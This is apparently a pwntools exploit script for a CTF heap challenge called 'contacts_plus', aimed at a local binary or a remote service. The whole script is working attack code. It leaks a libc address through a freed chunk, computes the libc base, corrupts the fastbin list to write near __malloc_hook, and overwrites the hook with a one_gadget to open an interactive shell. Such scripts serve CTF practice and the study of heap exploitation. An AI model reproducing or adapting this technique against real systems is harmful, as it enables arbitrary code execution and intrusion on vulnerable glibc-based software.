from pwn import *
import sys
import time
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./contacts_plus")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./contacts_plus")
else:
	p = remote("pwn2.humensec.com",6666)
	libc = ELF("libc.so.6")
	elf = ELF("./contacts_plus")

def add(name,No,length,des):
	p.sendlineafter(">>> ","1")
	p.sendlineafter("\tName: ",name)
	p.sendlineafter("\tEnter Phone No: ",No)
	p.sendlineafter("\tLength of description: ",str(length))
	p.sendafter("\tEnter description:\n\t\t",des)

def remove(name):
	p.sendlineafter(">>> ","2")
	p.sendlineafter("Name to remove? ",name)
	p.recvuntil("\n\n")

def edit_name(name,newname):
	p.sendlineafter(">>> ","3")
	p.sendlineafter("Input the name you want to change: ",name)
	p.sendlineafter(">>> ","1")
	p.sendlineafter("New name: ",newname)

def edit_des(name,des_len,des):
	p.sendlineafter(">>> ","3")
	p.sendlineafter("Input the name you want to change: ",name)
	p.sendlineafter(">>> ","2")
	p.sendlineafter("Length of description: ",str(des_len))
	p.sendafter("Description: \n\t",des)

def show():
	p.sendlineafter(">>> ","4")
	
code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1=hex(code_base+0x131b)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
#debugf()
add("a","1",0x10,"1\n")
add("b","2",0x100,"2\n")
#remove("a")
remove("a")
remove("b")
add("c","3",0x100,"3\n")
edit_des("",0x200,"4\n")
show()
p.recvuntil("\tDescription: ")
libc_addr = u64(p.recv(6).ljust(8,"\x00"))
print hex(libc_addr)
libc.address = libc_addr - libc.symbols["__malloc_hook"] - 0x10 - 344
log.success("libc_base:"+hex(libc.address))
#debugf()
size = 0x60
add("1","a",size,"1"*size)
add("2","a",size,"2"*size)
remove("1")
remove("2")
remove("")
add("3","a",size,p64(libc.symbols["__malloc_hook"]-0x23) + "\n")
add("4","a",size,p64(libc.symbols["__malloc_hook"]-0x23) + "\n")
one_gadget = libc.address + 0xf1147
payload = "bbb" + "a" * 0x10 + p64(one_gadget)
add("5","a",size,payload + "\n")
add("5","a",size,payload + "\n")
p.sendlineafter(">>> ","2")
p.interactive()
